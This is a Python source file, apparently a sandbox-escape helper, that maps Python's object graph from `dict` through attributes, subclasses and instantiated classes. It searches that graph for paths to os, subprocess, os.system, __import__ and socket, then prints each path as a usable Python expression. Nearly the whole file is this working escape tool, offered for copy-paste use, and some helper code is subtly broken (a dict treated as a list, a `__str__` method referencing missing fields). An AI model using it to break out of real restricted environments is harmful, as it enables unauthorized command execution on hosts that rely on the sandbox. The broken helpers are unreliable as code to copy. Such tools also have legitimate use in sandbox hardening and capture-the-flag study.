# Python sandbox escape helper.
# Code by Gynvael Coldwind (HexArcana, 2025), MIT license.
#
# You basically copy-paste most of the code into your app and then call
# find_escape_path() to get a couple of paths outputed.

from flask import Flask, request, jsonify, send_file
import math
import json

TYPE_ATTR = "attr"
TYPE_SUBCLASS = "subclass"
TYPE_DICT_VALUE = "dict_value"
TYPE_LIST_VALUE = "list_value"
TYPE_CLASS_INSTANCE = "class_instance"

class Node:
    def __init__(self, id, value):
        self.id = id
        self.value = value
        self.edges = []

    def add_edge(self, node):
        self.edges.append(node)

    def __str__(self):
        return f"Node({self.id}, {self.value})"

class Edge:
    def __init__(self, node1, node2, type, key, key_name=None):
        self.nodes = [node1, node2]
        self.start = node1
        self.target = node2
        self.type = type
        self.key = key
        self.key_name = key_name

    def __str__(self):
        return f"Edge({self.node1}, {self.node2}, {self.type}, {self.key})"

class Graph:
    def __init__(self):
        self.nodes = {}
        self.edges = []

    def add_node(self, node):
        self.nodes.append(node)

    def add_edge(self, edge):
        self.edges.append(edge)

def explore(graph, obj, depth, allow_ignored=False):
    if depth > 20:  # Change if there's a need to go deeper.
        return False

    # Skip our types.
    if (type(obj) in { Graph, Node, Edge } or
        obj is Graph or
        obj is Node or
        obj is Edge):
        return False

    # Skip basic types, since we're starting with them anyway.
    if not allow_ignored and (
        type(obj) in { int, str, float, bool } or
        obj is None
    ):
        return False

    # Skip already visited nodes.
    obj_id = id(obj)
    if obj_id in graph.nodes:
        return False

    node = Node(obj_id, obj)
    graph.nodes[obj_id] = node
    #print(obj_id, obj, flush=True)

    if callable(obj) and not isinstance(obj, type):
        return True  # Add to graph, but don't explore.

    # Explore attributes (including special ones).
    for attr in dir(obj) + ["__class__", "__dict__", "__base__", "__bases__", "__builtins__"]:
        if not hasattr(obj, attr):
            continue

        attr_obj = getattr(obj, attr)

        if explore(graph, attr_obj, depth+1):
            edge = Edge(node, attr_obj, TYPE_ATTR, attr)
            node.add_edge(edge)
            graph.add_edge(edge)

    # Explore subclasses.
    # Note that they are not instanciated here, but this does happen in the
    # recursive explore call.
    if hasattr(obj, "__subclasses__"):
        try:
            subclasses = obj.__subclasses__()
            for i, subclass in enumerate(subclasses):
                if explore(graph, subclass, depth+1):
                    edge = Edge(node, subclass, TYPE_SUBCLASS, i, subclass.   __name__)
                    node.add_edge(edge)
                    graph.add_edge(edge)
        except TypeError:
            print("Skipping subclasses of", obj)

    # Explore dict items.
    # Note that only keys are explored, since getting to values which are
    # of a different types than literals can have would be tricky.
    if type(obj) is dict:
        items = list(obj.items())
        for key, value in items:
            if explore(graph, value, depth+1):
                edge = Edge(node, value, TYPE_DICT_VALUE, key)
                node.add_edge(edge)
                graph.add_edge(edge)

    # Explore list items.
    if type(obj) is list:
        for i, value in enumerate(obj):
            if explore(graph, value, depth+1):
                edge = Edge(node, value, TYPE_LIST_VALUE, i)
                node.add_edge(edge)
                graph.add_edge(edge)

    # Instanciate the class and explore it.
    # Note that the class is instanciated without any arguments. This could
    # be further developed (just like in programming language fuzzing), but
    # there might be no need for this.
    # Some classes are skipped if they are known to cause weird issues.
    if "class" in str(obj) and (
          "'cell'" not in str(obj) and
          "'_ssl._SSLSocket'" not in str(obj) and
          "Thread'" not in str(obj)
    ):
        try:
            class_instance = obj()
            #print("Spawned", str(obj),class_instance)
            if explore(graph, class_instance, depth+1):
                edge = Edge(node, class_instance, TYPE_CLASS_INSTANCE, obj)
                node.add_edge(edge)
                graph.add_edge(edge)
        except Exception as e:
            #print("Skipping class instance of", obj, e)
            pass

    return True

def find_path(graph, start, end):
    # BFS search.
    start_node_id = id(start)
    end_node_id = id(end)

    assert start_node_id in graph.nodes
    if end_node_id not in graph.nodes:
        return None

    start_node = graph.nodes[start_node_id]
    end_node = graph.nodes[end_node_id]

    if start_node_id == end_node_id:
        return [start_node]

    queue = [(start_node, [start_node])]
    visited = {start_node_id}

    while queue:
        current_node, path = queue.pop(0)

        for edge in current_node.edges:
            neighbor = edge.target
            neighbor_id = id(neighbor)
            neighbor_node = graph.nodes.get(neighbor_id)

            if neighbor_node is None:
                continue

            if neighbor_id == end_node_id:
                return path + [edge]

            if neighbor_id not in visited:
                visited.add(neighbor_id)
                queue.append((neighbor_node, path + [edge]))

    return None

def print_path(path):
    if path is None:
        print("No path found")
        return

    usable = ""  # Valid Python code that can reach the desired object.

    for el in path:
        if type(el) is Edge:
            print("Edge", el.type, el.key, el.key_name if el.key_name else "")
            if el.type == TYPE_ATTR:
                usable += "." + el.key
            elif el.type == TYPE_SUBCLASS:
                usable += ".__subclasses__()[" + str(el.key) + "]"
            elif el.type == TYPE_DICT_VALUE:
                usable += "['" + el.key + "']"
            elif el.type == TYPE_LIST_VALUE:
                usable += "[" + str(el.key) + "]"
            elif el.type == TYPE_CLASS_INSTANCE:
                usable += "()"
        else:
            print("Node", el)
            usable += el.value.__name__

    print("Python code:", usable)


def find_escape_path():
    print("CREATING GRAPH...")
    graph = Graph()  # Expect a lot of warnings to be printed.

    start_obj = dict
    explore(graph, start_obj, depth=0, allow_ignored=True)

    # Technically we could add here other object to the graph, including
    # modules if we have them. But that's not needed actually.

    print("GRAPH READY!")
    print(f"Nodes: {len(graph.nodes)}, Edges: {len(graph.edges)}")

    print("------- OS MODULE -------")
    print_path(find_path(graph, start_obj, __import__('os')))

    print("------- SUBPROCESS MODULE -------")
    print_path(find_path(graph, start_obj, __import__('subprocess')))

    print("------- SYSTEM FUNCTION -------")
    print_path(find_path(graph, start_obj, __import__('os').system))

    print("------- __import__ FUNCTION -------")
    print_path(find_path(graph, start_obj, __import__))

    print("------- SOCKET MODULE -------")
    print_path(find_path(graph, start_obj, __import__('socket')))

    breakpoint()  # A breakpoint so we can double-check if it works.

    return graph


"""
app = Flask(__name__)

@app.route('/api/calculate', methods=['POST'])
def calculate():
    find_escape_path()
"""

if __name__ == '__main__':
    find_escape_path()

    #app.run(debug=True, host='0.0.0.0', port=5000)